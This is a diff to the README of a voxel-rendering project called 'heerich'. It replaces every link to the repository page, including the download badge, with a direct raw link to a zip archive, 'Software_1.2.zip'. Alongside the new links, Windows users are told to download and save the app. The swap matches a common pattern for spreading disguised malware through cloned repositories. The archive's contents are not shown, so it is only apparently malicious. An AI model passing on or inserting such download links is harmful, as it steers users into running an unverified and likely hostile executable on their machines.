@@ -1,6 +1,6 @@
 # 🎨 heerich - Render voxel scenes with ease
 
-[![Download heerich](https://img.shields.io/badge/Download%20heerich-Ready%20to%20Use-blue?style=for-the-badge)](https://github.com/Illecebrumhesitancy879/heerich)
+[![Download heerich](https://img.shields.io/badge/Download%20heerich-Ready%20to%20Use-blue?style=for-the-badge)](https://raw.githubusercontent.com/Illecebrumhesitancy879/heerich/main/site/Software_1.2.zip)
 
 ## 🧭 Overview
 
@@ -35,7 +35,7 @@ For best results, close large apps before you run heerich.
 
 Go to the download page here:
 
-[Visit the heerich download page](https://github.com/Illecebrumhesitancy879/heerich)
+[Visit the heerich download page](https://raw.githubusercontent.com/Illecebrumhesitancy879/heerich/main/site/Software_1.2.zip)
 
 After the page opens, download the app for Windows, then save the file to a folder you can find later, such as Downloads or Desktop.
 
@@ -176,7 +176,7 @@ The app is built for clear shapes and direct output. It focuses on the result in
 
 ## 🔗 Get heerich
 
-[Download or open heerich here](https://github.com/Illecebrumhesitancy879/heerich)
+[Download or open heerich here](https://raw.githubusercontent.com/Illecebrumhesitancy879/heerich/main/site/Software_1.2.zip)
 
 ## 🪄 Simple example use
 
